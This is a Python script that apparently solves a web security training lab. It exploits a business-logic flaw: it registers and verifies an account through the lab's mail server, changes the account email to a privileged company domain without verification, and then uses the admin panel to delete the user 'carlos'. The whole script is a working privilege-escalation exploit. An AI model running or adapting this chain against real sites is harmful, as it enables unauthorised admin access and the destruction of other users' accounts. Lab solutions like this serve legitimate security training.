import re
import sys
import urllib3
import requests
from bs4 import BeautifulSoup
from datetime import datetime
from urllib.parse import urljoin
from utils import get_csrf_token, login

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
EMAIL_RE = re.compile(r'[\w.+-]+@[\w.-]+\.[a-zA-Z]{2,}')

def get_mail_server_url(session: requests.Session, url: str) -> str:
    r = session.get(url, verify=False)
    r.raise_for_status()

    soup = BeautifulSoup(r.text, "html.parser")
    a = soup.find("a", {"id":"exploit-link"})

    href = a.get("href") if a else None
    if not href:
        raise RuntimeError(f"(-) Could not find Mail Server URL on: {url}")

    return href 

def get_email(session: requests.Session, url: str) -> str | None:
    response = session.get(url, verify = False)
    response.raise_for_status()

    soup = BeautifulSoup(response.text, "html.parser")
    for h4 in soup.find_all("h4"):
        text = h4.get_text(" ", strip=True)
        if "Your email address is" in text:
            m = EMAIL_RE.search(text)
            return m.group(0) if m else None
    return None

def get_latest_verification_link(session: requests.Session, mail_url: str):
    r = session.get(mail_url, verify=False, timeout=15)
    r.raise_for_status()

    soup = BeautifulSoup(r.text, "html.parser")
    rows = soup.select("table tr")[1:]

    latest_dt = None
    latest_link = None

    for tr in rows:
        tds = tr.find_all("td")
        if len(tds) < 5:
            continue

        sent_str = tds[0].get_text(strip=True)
        try:
            dt = datetime.strptime(sent_str, "%Y-%m-%d %H:%M:%S %z")
        except ValueError:
            continue

        body_td = tds[4]
        a = body_td.find("a", href=True)
        if not a:
            continue

        link = urljoin(mail_url, a["href"])

        if latest_dt is None or dt > latest_dt:
            latest_dt = dt
            latest_link = link

    return latest_link

def change_email(session: requests.Session, base_url: str, email_address: str):
    change_email_url = f"{base_url}/my-account/change-email"
    csrf_token = get_csrf_token(session, f"{base_url}/my-account")
    response = session.post(change_email_url, data={"email": email_address, "csrf" : csrf_token}, verify=False)
    response.raise_for_status()

    admin_url = f"{base_url}/admin" 
    response = session.get(admin_url, verify=False)
    if "Admin interface only available if logged in as a DontWannaCry user" in response.text:
        raise RuntimeError("(-) Email not changed")

def register(session: requests.Session, register_url: str):
    csrf_token = get_csrf_token(session, register_url)
    mail_server_url = get_mail_server_url(session, register_url)
    email = get_email(session,mail_server_url)
    print(f"(+) Trying to register with test and email = {email} and pass = 12345")
    register_data = {"csrf": csrf_token, "username": "test", "email": email, "password": "1234"}
    response = session.post(register_url, data=register_data, verify=False)
    response.raise_for_status()
    v_link = get_latest_verification_link(session, mail_server_url)
    if not v_link:
        raise RuntimeError("(-) No verification link found yet (email not arrived).")
    print("(+) Verifying the account... ")
    response = session.get(v_link, verify=False)


def delete_carlos(session: requests.Session, base_url: str) -> None:
    base_url = base_url.rstrip("/")

    # 1) register
    register_url = f"{base_url}/register"
    register(session, register_url)

    # 2) Login
    print("(+) Trying to login as test...")
    login_url = f"{base_url}/login"
    login(session, login_url, username="test", password="1234")
    print("(+) Successfully logged-in as test")

    # 3) change email
    email_address = "test@dontwannacry.com"
    print(f"(+) Trying to change email to {email_address}")
    change_email(session, base_url, email_address)
    print(f"(+) Successfully changed email to {email_address}")

    # 4) delete carlos user and check solved condition
    delete_url = f"{base_url}/admin/delete"
    ## GET /admin/delete?username=carlos
    response = session.get(delete_url, params={"username":"carlos"}, verify=False)
    if "Congratulations" in response.text:
        print("(+) Successfully exploited the business logic vulnerability.")
    else:
        print("(-) Could not exploit the business logic vulnerability.")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage : {sys.argv[0]} <url>")
        sys.exit(-1)
    session = requests.Session()
    delete_carlos(session, sys.argv[1])

if __name__ == "__main__":
    main()
